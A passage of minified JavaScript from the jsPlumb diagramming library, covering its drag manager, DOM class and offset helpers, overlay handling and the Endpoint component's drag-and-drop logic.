r=this.convertToFullOverlaySpec(n.overlays[i]);o[r[1].id]=r}this._endpointTypes[e].overlays=o}},registerEndpointTypes:function(t){for(var e in t)this.registerEndpointType(e,t[e])},getType:function(t,e){return"connection"===e?this._connectionTypes[t]:this._endpointTypes[t]},setIdChanged:function(t,e){this.setId(t,e,!0)},setParent:function(t,e){var n=this.getElement(t),o=this.getId(n),i=this.getElement(e),r=this.getId(i),s=this.getDragManager();n.parentNode.removeChild(n),i.appendChild(n),s&&s.setParent(n,o,i,r)},extend:function(t,e,n){var o;if(n)for(o=0;o<n.length;o++)t[n[o]]=e[n[o]];else for(o in e)t[o]=e[o];return t},floatingConnections:{},getFloatingAnchorIndex:function(t){return t.endpoints[0].isFloating()?0:t.endpoints[1].isFloating()?1:-1}});var p=new h;t.jsPlumb=p,p.getInstance=function(t,e){var n=new h(t);if(e)for(var o in e)n[o]=e[o];return n.init(),n},p.each=function(t,e){if(null!=t)if("string"==typeof t)e(p.getElement(t));else if(null!=t.length)for(var n=0;n<t.length;n++)e(p.getElement(t[n]));else e(t)},"undefined"!=typeof exports&&(exports.jsPlumb=p)}.call("undefined"!=typeof window?window:this),function(){var t=this.jsPlumbUtil,e=function(t,e){if(null==e)return[0,0];var n=s(e),o=r(n,0);return[o[t+"X"],o[t+"Y"]]},n=e.bind(this,"page"),o=e.bind(this,"screen"),i=e.bind(this,"client"),r=function(t,e){return t.item?t.item(e):t[e]},s=function(t){return t.touches&&t.touches.length>0?t.touches:t.changedTouches&&t.changedTouches.length>0?t.changedTouches:t.targetTouches&&t.targetTouches.length>0?t.targetTouches:[t]},a=function(t,e,n){var o;e=null==(o=e)?null:o.replace(/^\s\s*/,"").replace(/\s\s*$/,""),void 0!==t.className.baseVal?t.className.baseVal=e:t.className=e;try{var i=t.classList;if(null!=i){for(;i.length>0;)i.remove(i.item(0));for(var r=0;r<n.length;r++)n[r]&&i.add(n[r])}}catch(t){jsPlumbUtil.log("JSPLUMB: cannot set class list",t)}},l=function(t){return void 0===t.className.baseVal?t.className:t.className.baseVal},d=function(e,n,o){n=null==n?[]:t.isArray(n)?n:n.split(/\s+/),o=null==o?[]:t.isArray(o)?o:o.split(/\s+/);var i=l(e).split(/\s+/),r=function(t,e){for(var n=0;n<e.length;n++)if(t)-1===i.indexOf(e[n])&&i.push(e[n]);else{var o=i.indexOf(e[n]);-1!==o&&i.splice(o,1)}};r(!0,n),r(!1,o),a(e,i.join(" "),i)};this.jsPlumb.extend(this.jsPlumbInstance.prototype,{headless:!1,pageLocation:n,screenLocation:o,clientLocation:i,getDragManager:function(){return null==this.dragManager&&(this.dragManager=new function(t){var e={},n=[],o={},i={},r={};this.register=function(s){var a,l=t.getId(s);e[l]||(e[l]=s,n.push(s),o[l]={});var d=function(e){if(e)for(var n=0;n<e.childNodes.length;n++)if(3!==e.childNodes[n].nodeType&&8!==e.childNodes[n].nodeType){var u=jsPlumb.getElement(e.childNodes[n]),c=t.getId(e.childNodes[n],null,!0);if(c&&i[c]&&i[c]>0){a||(a=t.getOffset(s));var h=t.getOffset(u);o[l][c]={id:c,offset:{left:h.left-a.left,top:h.top-a.top}},r[c]=l}d(e.childNodes[n])}};d(s)},this.updateOffsets=function(e,n){if(null!=e){n=n||{};var i,s=jsPlumb.getElement(e),a=t.getId(s),l=o[a];if(l)for(var d in l)if(l.hasOwnProperty(d)){var u=jsPlumb.getElement(d),c=n[d]||t.getOffset(u);if(null==u.offsetParent&&null!=o[a][d])continue;i||(i=t.getOffset(s)),o[a][d]={id:d,offset:{left:c.left-i.left,top:c.top-i.top}},r[d]=a}}},this.endpointAdded=function(n,s){s=s||t.getId(n);var a=document.body,l=n.parentNode;for(i[s]=i[s]?i[s]+1:1;null!=l&&l!==a;){var d=t.getId(l,null,!0);if(d&&e[d]){var u=t.getOffset(l);if(null==o[d][s]){var c=t.getOffset(n);o[d][s]={id:s,offset:{left:c.left-u.left,top:c.top-u.top}},r[s]=d}break}l=l.parentNode}},this.endpointDeleted=function(t){if(i[t.elementId]&&--i[t.elementId]<=0)for(var e in o)o.hasOwnProperty(e)&&o[e]&&(delete o[e][t.elementId],delete r[t.elementId])},this.changeId=function(t,e){o[e]=o[t],o[t]={},r[e]=r[t],r[t]=null},this.getElementsForDraggable=function(t){return o[t]},this.elementRemoved=function(t){var e=r[t];e&&(delete o[e][t],delete r[t])},this.reset=function(){e={},n=[],o={},i={}},this.dragEnded=function(e){if(null!=e.offsetParent){var n=t.getId(e),o=r[n];o&&this.updateOffsets(o)}},this.setParent=function(e,n,i,s,a){var l=r[n];o[s]||(o[s]={});var d=t.getOffset(i),u=a||t.getOffset(e);l&&o[l]&&delete o[l][n],o[s][n]={id:n,offset:{left:u.left-d.left,top:u.top-d.top}},r[n]=s},this.clearParent=function(t,e){var n=r[e];n&&(delete o[n][e],delete r[e])},this.revalidateParent=function(e,n,o){var i=r[n];if(i){var s={};s[n]=o,this.updateOffsets(i,s),t.revalidate(i)}},this.getDragAncestor=function(e){var n=jsPlumb.getElement(e),o=t.getId(n),i=r[o];return i?jsPlumb.getElement(i):null}}(this)),this.dragManager},recalculateOffsets:function(t){this.getDragManager().updateOffsets(t)},createElement:function(t,e,n,o){return this.createElementNS(null,t,e,n,o)},createElementNS:function(t,e,n,o,i){var r,s=null==t?document.createElement(e):document.createElementNS(t,e);n=n||{};for(r in n)s.style[r]=n[r];o&&(s.className=o),i=i||{};for(r in i)s.setAttribute(r,""+i[r]);return s},getAttribute:function(t,e){return null!=t.getAttribute?t.getAttribute(e):null},setAttribute:function(t,e,n){null!=t.setAttribute&&t.setAttribute(e,n)},setAttributes:function(t,e){for(var n in e)e.hasOwnProperty(n)&&t.setAttribute(n,e[n])},appendToRoot:function(t){document.body.appendChild(t)},getRenderModes:function(){return["svg"]},getClass:l,addClass:function(t,e){jsPlumb.each(t,function(t){d(t,e)})},hasClass:function(t,e){return(t=jsPlumb.getElement(t)).classList?t.classList.contains(e):-1!==l(t).indexOf(e)},removeClass:function(t,e){jsPlumb.each(t,function(t){d(t,null,e)})},toggleClass:function(t,e){jsPlumb.hasClass(t,e)?jsPlumb.removeClass(t,e):jsPlumb.addClass(t,e)},updateClasses:function(t,e,n){jsPlumb.each(t,function(t){d(t,e,n)})},setClass:function(t,e){null!=e&&jsPlumb.each(t,function(t){a(t,e,e.split(/\s+/))})},setPosition:function(t,e){t.style.left=e.left+"px",t.style.top=e.top+"px"},getPosition:function(t){var e=function(e){var n=t.style[e];return n?n.substring(0,n.length-2):0};return{left:e("left"),top:e("top")}},getStyle:function(t,e){return void 0!==window.getComputedStyle?getComputedStyle(t,null).getPropertyValue(e):t.currentStyle[e]},getSelector:function(t,e){return 1===arguments.length?null!=t.nodeType?t:document.querySelectorAll(t):t.querySelectorAll(e)},getOffset:function(t,e,n){t=jsPlumb.getElement(t),n=n||this.getContainer();for(var o={left:t.offsetLeft,top:t.offsetTop},i=e||null!=n&&t!==n&&t.offsetParent!==n?t.offsetParent:null,r=function(t){null!=t&&t!==document.body&&(t.scrollTop>0||t.scrollLeft>0)&&(o.left-=t.scrollLeft,o.top-=t.scrollTop)}.bind(this);null!=i;)o.left+=i.offsetLeft,o.top+=i.offsetTop,r(i),i=e?i.offsetParent:i.offsetParent===n?null:i.offsetParent;if(null!=n&&!e&&(n.scrollTop>0||n.scrollLeft>0)){var s=null!=t.offsetParent?this.getStyle(t.offsetParent,"position"):"static",a=this.getStyle(t,"position");"absolute"!==a&&"fixed"!==a&&"absolute"!==s&&"fixed"!==s&&(o.left-=n.scrollLeft,o.top-=n.scrollTop)}return o},getPositionOnElement:function(t,e,n){var o=void 0!==e.getBoundingClientRect?e.getBoundingClientRect():{left:0,top:0,width:0,height:0},i=document.body,r=document.documentElement,s=window.pageYOffset||r.scrollTop||i.scrollTop,a=window.pageXOffset||r.scrollLeft||i.scrollLeft,l=r.clientTop||i.clientTop||0,d=r.clientLeft||i.clientLeft||0,u=o.top+s-l+0*n,c=o.left+a-d+0*n,h=jsPlumb.pageLocation(t),p=o.width||e.offsetWidth*n,f=o.height||e.offsetHeight*n;return[(h[0]-c)/p,(h[1]-u)/f]},getAbsolutePosition:function(t){var e=function(e){var n=t.style[e];if(n)return parseFloat(n.substring(0,n.length-2))};return[e("left"),e("top")]},setAbsolutePosition:function(t,e,n,o){n?this.animate(t,{left:"+="+(e[0]-n[0]),top:"+="+(e[1]-n[1])},o):(t.style.left=e[0]+"px",t.style.top=e[1]+"px")},getSize:function(t){return[t.offsetWidth,t.offsetHeight]},getWidth:function(t){return t.offsetWidth},getHeight:function(t){return t.offsetHeight},getRenderMode:function(){return"svg"}})}.call("undefined"!=typeof window?window:this),function(){"use strict";var t=this,e=t.jsPlumb,n=t.jsPlumbUtil,o="__label";e.OverlayCapableJsPlumbUIComponent=function(e){t.jsPlumbUIComponent.apply(this,arguments),this._jsPlumb.overlays={},this._jsPlumb.overlayPositions={},e.label&&(this.getDefaultType().overlays[o]=["Label",{label:e.label,location:e.labelLocation||this.defaultLabelLocation||.5,labelStyle:e.labelStyle||this._jsPlumb.instance.Defaults.LabelStyle,id:o}]),this.setListenerComponent=function(t){if(this._jsPlumb)for(var e in this._jsPlumb.overlays)this._jsPlumb.overlays[e].setListenerComponent(t)}},e.OverlayCapableJsPlumbUIComponent.applyType=function(t,e){if(e.overlays){var n,o={};for(n in e.overlays){var i=t._jsPlumb.overlays[e.overlays[n][1].id];if(i)i.updateFrom(e.overlays[n][1]),o[e.overlays[n][1].id]=!0;else{var r=t.getCachedTypeItem("overlay",e.overlays[n][1].id);null!=r?(r.reattach(t._jsPlumb.instance,t),r.setVisible(!0),r.updateFrom(e.overlays[n][1]),t._jsPlumb.overlays[r.id]=r):r=t.addOverlay(e.overlays[n],!0),o[r.id]=!0}}for(n in t._jsPlumb.overlays)null==o[t._jsPlumb.overlays[n].id]&&t.removeOverlay(t._jsPlumb.overlays[n].id,!0)}},n.extend(e.OverlayCapableJsPlumbUIComponent,t.jsPlumbUIComponent,{setHover:function(t,e){if(this._jsPlumb&&!this._jsPlumb.instance.isConnectionBeingDragged())for(var n in this._jsPlumb.overlays)this._jsPlumb.overlays[n][t?"addClass":"removeClass"](this._jsPlumb.instance.hoverClass)},addOverlay:function(t,o){var i=function(t,o){var i=null;if(n.isArray(o)){var r=o[0],s=e.extend({component:t,_jsPlumb:t._jsPlumb.instance},o[1]);3===o.length&&e.extend(s,o[2]),i=new(e.Overlays[t._jsPlumb.instance.getRenderMode()][r])(s)}else i=o.constructor===String?new(e.Overlays[t._jsPlumb.instance.getRenderMode()][o])({component:t,_jsPlumb:t._jsPlumb.instance}):o;return i.id=i.id||n.uuid(),t.cacheTypeItem("overlay",i,i.id),t._jsPlumb.overlays[i.id]=i,i}(this,t);return o||this.repaint(),i},getOverlay:function(t){return this._jsPlumb.overlays[t]},getOverlays:function(){return this._jsPlumb.overlays},hideOverlay:function(t){var e=this.getOverlay(t);e&&e.hide()},hideOverlays:function(){for(var t in this._jsPlumb.overlays)this._jsPlumb.overlays[t].hide()},showOverlay:function(t){var e=this.getOverlay(t);e&&e.show()},showOverlays:function(){for(var t in this._jsPlumb.overlays)this._jsPlumb.overlays[t].show()},removeAllOverlays:function(t){for(var e in this._jsPlumb.overlays)this._jsPlumb.overlays[e].cleanup&&this._jsPlumb.overlays[e].cleanup();this._jsPlumb.overlays={},this._jsPlumb.overlayPositions=null,t||this.repaint()},removeOverlay:function(t,e){var n=this._jsPlumb.overlays[t];n&&(n.setVisible(!1),!e&&n.cleanup&&n.cleanup(),delete this._jsPlumb.overlays[t],this._jsPlumb.overlayPositions&&delete this._jsPlumb.overlayPositions[t])},removeOverlays:function(){for(var t=0,e=arguments.length;t<e;t++)this.removeOverlay(arguments[t])},moveParent:function(t){if(this.bgCanvas&&(this.bgCanvas.parentNode.removeChild(this.bgCanvas),t.appendChild(this.bgCanvas)),this.canvas&&this.canvas.parentNode){this.canvas.parentNode.removeChild(this.canvas),t.appendChild(this.canvas);for(var e in this._jsPlumb.overlays)if(this._jsPlumb.overlays[e].isAppendedAtTopLevel){var n=this._jsPlumb.overlays[e].getElement();n.parentNode.removeChild(n),t.appendChild(n)}}},getLabel:function(){var t=this.getOverlay(o);return null!=t?t.getLabel():null},getLabelOverlay:function(){return this.getOverlay(o)},setLabel:function(t){var n,i,r,s,a=this.getOverlay(o);if(a)t.constructor===String||t.constructor===Function?a.setLabel(t):(t.label&&a.setLabel(t.label),t.location&&a.setLocation(t.location));else{var l=t.constructor===String||t.constructor===Function?{label:t}:t;n=this,r={cssClass:(i=l).cssClass,labelStyle:n.labelStyle,id:o,component:n,_jsPlumb:n._jsPlumb.instance},s=e.extend(r,i),a=new(e.Overlays[n._jsPlumb.instance.getRenderMode()].Label)(s),this._jsPlumb.overlays[o]=a}this._jsPlumb.instance.isSuspendDrawing()||this.repaint()},cleanup:function(t){for(var e in this._jsPlumb.overlays)this._jsPlumb.overlays[e].cleanup(t),this._jsPlumb.overlays[e].destroy(t);t&&(this._jsPlumb.overlays={},this._jsPlumb.overlayPositions=null)},setVisible:function(t){this[t?"showOverlays":"hideOverlays"]()},setAbsoluteOverlayPosition:function(t,e){this._jsPlumb.overlayPositions[t.id]=e},getAbsoluteOverlayPosition:function(t){return this._jsPlumb.overlayPositions?this._jsPlumb.overlayPositions[t.id]:null},_clazzManip:function(t,e,n){if(!n)for(var o in this._jsPlumb.overlays)this._jsPlumb.overlays[o][t+"Class"](e)},addClass:function(t,e){this._clazzManip("add",t,e)},removeClass:function(t,e){this._clazzManip("remove",t,e)}})}.call("undefined"!=typeof window?window:this),function(){"use strict";var t=this.jsPlumb,e=this.jsPlumbUtil,n=["connectorStyle","connectorHoverStyle","connectorOverlays","connector","connectionType","connectorClass","connectorHoverClass"];t.Endpoint=function(o){var i=o._jsPlumb,r=o.newConnection,s=o.newEndpoint;this.idPrefix="_jsplumb_e_",this.defaultLabelLocation=[.5,.5],this.defaultOverlayKeys=["Overlays","EndpointOverlays"],t.OverlayCapableJsPlumbUIComponent.apply(this,arguments),this.appendToDefaultType({connectionType:o.connectionType,maxConnections:null==o.maxConnections?this._jsPlumb.instance.Defaults.MaxConnections:o.maxConnections,paintStyle:o.endpointStyle||o.paintStyle||o.style||this._jsPlumb.instance.Defaults.EndpointStyle||t.Defaults.EndpointStyle,hoverPaintStyle:o.endpointHoverStyle||o.hoverPaintStyle||this._jsPlumb.instance.Defaults.EndpointHoverStyle||t.Defaults.EndpointHoverStyle,connectorStyle:o.connectorStyle,connectorHoverStyle:o.connectorHoverStyle,connectorClass:o.connectorClass,connectorHoverClass:o.connectorHoverClass,connectorOverlays:o.connectorOverlays,connector:o.connector,connectorTooltip:o.connectorTooltip}),this._jsPlumb.enabled=!(!1===o.enabled),this._jsPlumb.visible=!0,this.element=t.getElement(o.source),this._jsPlumb.uuid=o.uuid,this._jsPlumb.floatingEndpoint=null;this._jsPlumb.uuid&&(o.endpointsByUUID[this._jsPlumb.uuid]=this),this.elementId=o.elementId,this.dragProxy=o.dragProxy,this._jsPlumb.connectionCost=o.connectionCost,this._jsPlumb.connectionsDirected=o.connectionsDirected,this._jsPlumb.currentAnchorClass="",this._jsPlumb.events={};var a=!0===o.deleteOnEmpty;this.setDeleteOnEmpty=function(t){a=t};var l=function(){var e=i.endpointAnchorClassPrefix+"-"+this._jsPlumb.currentAnchorClass;this._jsPlumb.currentAnchorClass=this.anchor.getCssClass();var n=i.endpointAnchorClassPrefix+(this._jsPlumb.currentAnchorClass?"-"+this._jsPlumb.currentAnchorClass:"");this.removeClass(e),this.addClass(n),t.updateClasses(this.element,n,e)}.bind(this);this.prepareAnchor=function(t){var e=this._jsPlumb.instance.makeAnchor(t,this.elementId,i);return e.bind("anchorChanged",function(t){this.fire("anchorChanged",{endpoint:this,anchor:t}),l()}.bind(this)),e},this.setPreparedAnchor=function(t,e){return this._jsPlumb.instance.continuousAnchorFactory.clear(this.elementId),this.anchor=t,l(),e||this._jsPlumb.instance.repaint(this.elementId),this},this.setAnchor=function(t,e){var n=this.prepareAnchor(t);return this.setPreparedAnchor(n,e),this};var d=function(t){if(this.connections.length>0)for(var e=0;e<this.connections.length;e++)this.connections[e].setHover(t,!1);else this.setHover(t)}.bind(this);this.bind("mouseover",function(){d(!0)}),this.bind("mouseout",function(){d(!1)}),o._transient||this._jsPlumb.instance.anchorManager.add(this,this.elementId),this.prepareEndpoint=function(n,r){var s,a=function(e,n){var o=i.getRenderMode();if(t.Endpoints[o][e])return new t.Endpoints[o][e](n);if(!i.Defaults.DoNotThrowErrors)throw{msg:"jsPlumb: unknown endpoint type '"+e+"'"}},l={_jsPlumb:this._jsPlumb.instance,cssClass:o.cssClass,container:o.container,tooltip:o.tooltip,connectorTooltip:o.connectorTooltip,endpoint:this};return e.isString(n)?s=a(n,l):e.isArray(n)?(l=e.merge(n[1],l),s=a(n[0],l)):s=n.clone(),s.clone=function(){return e.isString(n)?a(n,l):e.isArray(n)?(l=e.merge(n[1],l),a(n[0],l)):void 0}.bind(this),s.typeId=r,s},this.setEndpoint=function(t,e){var n=this.prepareEndpoint(t);this.setPreparedEndpoint(n,!0)},this.setPreparedEndpoint=function(t,e){null!=this.endpoint&&(this.endpoint.cleanup(),this.endpoint.destroy()),this.endpoint=t,this.type=this.endpoint.type,this.canvas=this.endpoint.canvas},t.extend(this,o,n),this.isSource=o.isSource||!1,this.isTemporarySource=o.isTemporarySource||!1,this.isTarget=o.isTarget||!1,this.connections=o.connections||[],this.connectorPointerEvents=o["connector-pointer-events"],this.scope=o.scope||i.getDefaultScope(),this.timestamp=null,this.reattachConnections=o.reattach||i.Defaults.ReattachConnections,this.connectionsDetachable=i.Defaults.ConnectionsDetachable,!1!==o.connectionsDetachable&&!1!==o.detachable||(this.connectionsDetachable=!1),this.dragAllowedWhenFull=!1!==o.dragAllowedWhenFull,o.onMaxConnections&&this.bind("maxConnections",o.onMaxConnections),this.addConnection=function(t){this.connections.push(t),this[(this.connections.length>0?"add":"remove")+"Class"](i.endpointConnectedClass),this[(this.isFull()?"add":"remove")+"Class"](i.endpointFullClass)},this.detachFromConnection=function(t,e,n){(e=null==e?this.connections.indexOf(t):e)>=0&&(this.connections.splice(e,1),this[(this.connections.length>0?"add":"remove")+"Class"](i.endpointConnectedClass),this[(this.isFull()?"add":"remove")+"Class"](i.endpointFullClass)),!n&&a&&0===this.connections.length&&i.deleteObject({endpoint:this,fireEvent:!1,deleteAttachedObjects:!0!==n})},this.deleteEveryConnection=function(t){for(var e=this.connections.length,n=0;n<e;n++)i.deleteConnection(this.connections[0],t)},this.detachFrom=function(t,e,n){for(var o=[],r=0;r<this.connections.length;r++)this.connections[r].endpoints[1]!==t&&this.connections[r].endpoints[0]!==t||o.push(this.connections[r]);for(var s=0,a=o.length;s<a;s++)i.deleteConnection(o[0]);return this},this.getElement=function(){return this.element},this.setElement=function(n){var r=this._jsPlumb.instance.getId(n),s=this.elementId;return e.removeWithFunction(o.endpointsByElement[this.elementId],function(t){return t.id===this.id}.bind(this)),this.element=t.getElement(n),this.elementId=i.getId(this.element),i.anchorManager.rehomeEndpoint(this,s,this.element),i.dragManager.endpointAdded(this.element),e.addToList(o.endpointsByElement,r,this),this},this.makeInPlaceCopy=function(){var t=this.anchor.getCurrentLocation({element:this}),e=this.anchor.getOrientation(this),n=this.anchor.getCssClass(),i={bind:function(){},compute:function(){return[t[0],t[1]]},getCurrentLocation:function(){return[t[0],t[1]]},getOrientation:function(){return e},getCssClass:function(){return n}};return s({dropOptions:o.dropOptions,anchor:i,source:this.element,paintStyle:this.getPaintStyle(),endpoint:o.hideOnDrag?"Blank":this.endpoint,_transient:!0,scope:this.scope,reference:this})},this.connectorSelector=function(){return this.connections[0]},this.setStyle=this.setPaintStyle,this.paint=function(t){var e=(t=t||{}).timestamp,n=!(!1===t.recalc);if(!e||this.timestamp!==e){var o=i.updateOffset({elId:this.elementId,timestamp:e}),r=t.offset?t.offset.o:o.o;if(null!=r){var s=t.anchorPoint,a=t.connectorPaintStyle;if(null==s){var l=t.dimensions||o.s,d={xy:[r.left,r.top],wh:l,element:this,timestamp:e};if(n&&this.anchor.isDynamic&&this.connections.length>0){var u=function(t,e){var n=0;if(null!=e)for(var o=0;o<t.connections.length;o++)if(t.connections[o].sourceId===e||t.connections[o].targetId===e){n=o;break}return t.connections[n]}(this,t.elementWithPrecedence),c=u.endpoints[0]===this?1:0,h=0===c?u.sourceId:u.targetId,p=i.getCachedData(h),f=p.o,g=p.s;d.index=0===c?1:0,d.connection=u,d.txy=[f.left,f.top],d.twh=g,d.tElement=u.endpoints[c]}else this.connections.length>0&&(d.connection=this.connections[0]);s=this.anchor.compute(d)}this.endpoint.compute(s,this.anchor.getOrientation(this),this._jsPlumb.paintStyleInUse,a||this.paintStyleInUse),this.endpoint.paint(this._jsPlumb.paintStyleInUse,this.anchor),this.timestamp=e;for(var _ in this._jsPlumb.overlays)if(this._jsPlumb.overlays.hasOwnProperty(_)){var b=this._jsPlumb.overlays[_];b.isVisible()&&(this._jsPlumb.overlayPlacements[_]=b.draw(this.endpoint,this._jsPlumb.paintStyleInUse),b.paint(this._jsPlumb.overlayPlacements[_]))}}}},this.getTypeDescriptor=function(){return"endpoint"},this.isVisible=function(){return this._jsPlumb.visible},this.repaint=this.paint;var u=!1;this.initDraggable=function(){if(!u&&t.isDragSupported(this.element)){var n,a={id:null,element:null},l=null,d=!1,c=null,h=(w=this,j=a,y=i,P=!1,{drag:function(){if(P)return P=!1,!0;if(j.element){var t=y.getUIPosition(arguments,y.getZoom());null!=t&&y.setPosition(j.element,t),y.repaint(j.element,t),w.paint({anchorPoint:w.anchor.getCurrentLocation({element:w})})}},stopDrag:function(){P=!0}}),p=o.dragOptions||{},f=t.dragEvents.start,g=t.dragEvents.stop,_=t.dragEvents.drag,b=t.dragEvents.beforeStart,v=function(e){l=this.connectorSelector();var u=!0;this.isEnabled()||(u=!1),null!=l||this.isSource||this.isTemporarySource||(u=!1),!this.isSource||!this.isFull()||null!=l&&this.dragAllowedWhenFull||(u=!1),null==l||l.isDetachable(this)||(this.isFull()?u=!1:l=null);var p=i.checkCondition(null==l?"beforeDrag":"beforeStartDetach",{endpoint:this,source:this.element,sourceId:this.elementId,connection:l});if(!1===p?u=!1:"object"==typeof p?t.extend(p,n||{}):p=n||{},!1===u)return i.stopDrag&&i.stopDrag(this.canvas),h.stopDrag(),!1;for(var f=0;f<this.connections.length;f++)this.connections[f].setHover(!1);this.addClass("endpointDrag"),i.setConnectionBeingDragged(!0),l&&!this.isFull()&&this.isSource&&(l=null),i.updateOffset({elId:this.elementId});var g=this._jsPlumb.instance.getOffset(this.canvas),_=this.canvas,b=this._jsPlumb.instance.getSize(this.canvas);(function(t,e,n,o){var i=e.createElement("div",{position:"absolute"});e.appendElement(i);var r=e.getId(i);e.setPosition(i,n),i.style.width=o[0]+"px",i.style.height=o[1]+"px",e.manage(r,i,!0),t.id=r,t.element=i})(a,i,g,b),i.setAttributes(this.canvas,{dragId:a.id,elId:this.elementId});var v=this.dragProxy||this.endpoint;if(null==this.dragProxy&&null!=this.connectionType){var m=this._jsPlumb.instance.deriveEndpointAndAnchorSpec(this.connectionType);m.endpoints[1]&&(v=m.endpoints[1])}var w,j,y,P,E,x,C,S,I=this._jsPlumb.instance.makeAnchor("Center");I.isFloating=!0,this._jsPlumb.floatingEndpoint=(w=this.getPaintStyle(),j=I,y=v,P=this.canvas,E=a.element,x=i,C=s,S=this.scope,C({paintStyle:w,endpoint:y,anchor:new t.FloatingAnchor({reference:j,referenceCanvas:P,jsPlumbInstance:x}),source:E,scope:S}));var A=this._jsPlumb.floatingEndpoint.anchor;if(null==l)this.setHover(!1,!1),l=r({sourceEndpoint:this,targetEndpoint:this._jsPlumb.floatingEndpoint,source:this.element,target:a.element,anchors:[this.anchor,this._jsPlumb.floatingEndpoint.anchor],paintStyle:o.connectorStyle,hoverPaintStyle:o.connectorHoverStyle,connector:o.connector,overlays:o.connectorOverlays,type:this.connectionType,cssClass:this.connectorClass,hoverClass:this.connectorHoverClass,scope:o.scope,data:p}),l.pending=!0,l.addClass(i.draggingClass),this._jsPlumb.floatingEndpoint.addClass(i.draggingClass),this._jsPlumb.floatingEndpoint.anchor=A,i.fire("connectionDrag",l),i.anchorManager.newConnection(l);else{d=!0,l.setHover(!1);var T=l.endpoints[0].id===this.id?0:1;this.detachFromConnection(l,null,!0);var k=i.getDragScope(_);i.setAttribute(this.canvas,"originalScope",k),i.fire("connectionDrag",l),0===T?(c=[l.source,l.sourceId,_,k],i.anchorManager.sourceChanged(l.endpoints[T].elementId,a.id,l,a.element)):(c=[l.target,l.targetId,_,k],l.target=a.element,l.targetId=a.id,i.anchorManager.updateOtherEndpoint(l.sourceId,l.endpoints[T].elementId,l.targetId,l)),l.suspendedEndpoint=l.endpoints[T],l.suspendedElement=l.endpoints[T].getElement(),l.suspendedElementId=l.endpoints[T].elementId,l.suspendedElementType=0===T?"source":"target",l.suspendedEndpoint.setHover(!1),this._jsPlumb.floatingEndpoint.referenceEndpoint=l.suspendedEndpoint,l.endpoints[T]=this._jsPlumb.floatingEndpoint,l.addClass(i.draggingClass),this._jsPlumb.floatingEndpoint.addClass(i.draggingClass)}i.registerFloatingConnection(a,l,this._jsPlumb.floatingEndpoint),i.currentlyDragging=!0}.bind(this),m=function(){if(i.setConnectionBeingDragged(!1),l&&null!=l.endpoints){var t=i.getDropEvent(arguments),e=i.getFloatingAnchorIndex(l);if(l.endpoints[0===e?1:0].anchor.unlock(),l.removeClass(i.draggingClass),this._jsPlumb&&(l.deleteConnectionNow||l.endpoints[e]===this._jsPlumb.floatingEndpoint)&&d&&l.suspendedEndpoint){0===e?(l.floatingElement=l.source,l.floatingId=l.sourceId,l.floatingEndpoint=l.endpoints[0],l.floatingIndex=0,l.source=c[0],l.sourceId=c[1]):(l.floatingElement=l.target,l.floatingId=l.targetId,l.floatingEndpoint=l.endpoints[1],l.floatingIndex=1,l.target=c[0],l.targetId=c[1]);var n=this._jsPlumb.floatingEndpoint;i.setDragScope(c[2],c[3]),l.endpoints[e]=l.suspendedEndpoint,l.isReattach()||l._forceReattach||l._forceDetach||!i.deleteConnection(l,{originalEvent:t})?(l.setHover(!1),l._forceDetach=null,l._forceReattach=null,this._jsPlumb.floatingEndpoint.detachFromConnection(l),l.suspendedEndpoint.addConnection(l),1===e?i.anchorManager.updateOtherEndpoint(l.sourceId,l.floatingId,l.targetId,l):i.anchorManager.sourceChanged(l.floatingId,l.sourceId,l,l.source),i.repaint(c[1])):i.deleteObject({endpoint:n})}this.deleteAfterDragStop?i.deleteObject({endpoint:this}):this._jsPlumb&&this.paint({recalc:!1}),i.fire("connectionDragStop",l,t),l.pending&&i.fire("connectionAborted",l,t),i.currentlyDragging=!1,l.suspendedElement=null,l.suspendedEndpoint=null,l=null}a&&a.element&&i.remove(a.element,!1,!1),this._jsPlumb&&(this.canvas.style.visibility="visible",this.anchor.unlock(),this._jsPlumb.floatingEndpoint=null)}.bind(this);(p=t.extend({},p)).scope=this.scope||p.scope,p[b]=e.wrap(p[b],function(t){n=t.e.payload||{}},!1),p[f]=e.wrap(p[f],v,!1),p[_]=e.wrap(p[_],h.drag),p[g]=e.wrap(p[g],m),p.multipleDrop=!1,p.canDrag=function(){return this.isSource||this.isTemporarySource||this.connections.length>0}.bind(this),i.initDraggable(this.canvas,p,"internal"),this.canvas._jsPlumbRelatedElement=this.element,u=!0}var w,j,y,P};var c=o.endpoint||this._jsPlumb.instance.Defaults.Endpoint||t.Defaults.Endpoint;this.setEndpoint(c,!0);var h=o.anchor?o.anchor:o.anchors?o.anchors:i.Defaults.Anchor||"Top";this.setAnchor(h,!0);var p=["default",o.type||""].join(" ");this.addType(p,o.data,!0),this.canvas=this.endpoint.canvas,this.canvas._jsPlumb=this,this.initDraggable();var f=function(n,r,s,a){if(t.isDropSupported(this.element)){var l=o.dropOptions||i.Defaults.DropOptions||t.Defaults.DropOptions;(l=t.extend({},l)).scope=l.scope||this.scope;var d=t.dragEvents.drop,u=t.dragEvents.over,c=t.dragEvents.out,h=this,p=i.EndpointDropHandler({getEndpoint:function(){return h},jsPlumb:i,enabled:function(){return null==s||s.isEnabled()},isFull:function(){return s.isFull()},element:this.element,elementId:this.elementId,isSource:this.isSource,isTarget:this.isTarget,addClass:function(t){h.addClass(t)},removeClass:function(t){h.removeClass(t)},isDropAllowed:function(){return h.isDropAllowed.apply(h,arguments)},reference:a,isRedrop:function(t,e){return t.suspendedEndpoint&&e.reference&&t.suspendedEndpoint.id===e.reference.id}});l[d]=e.wrap(l[d],p,!0),l[u]=e.wrap(l[u],function(){var e=t.getDragObject(arguments),n=i.getAttribute(t.getElement(e),"dragId"),o=i.getFloatingConnectionFor(n);if(null!=o){var r=i.getFloatingAnchorIndex(o);if(this.isTarget&&0!==r||o.suspendedEndpoint&&this.referenceEndpoint&&this.referenceEndpoint.id===o.suspendedEndpoint.id){var s=i.checkCondition("checkDropAllowed",{sourceEndpoint:o.endpoints[r],targetEndpoint:this,connection:o});this[(s?"add":"remove")+"Class"](i.endpointDropAllowedClass),this[(s?"remove":"add")+"Class"](i.endpointDropForbiddenClass),o.endpoints[r].anchor.over(this.anchor,this)}}}.bind(this)),l[c]=e.wrap(l[c],function(){var e=t.getDragObject(arguments),n=null==e?null:i.getAttribute(t.getElement(e),"dragId"),o=n?i.getFloatingConnectionFor(n):null;if(null!=o){var 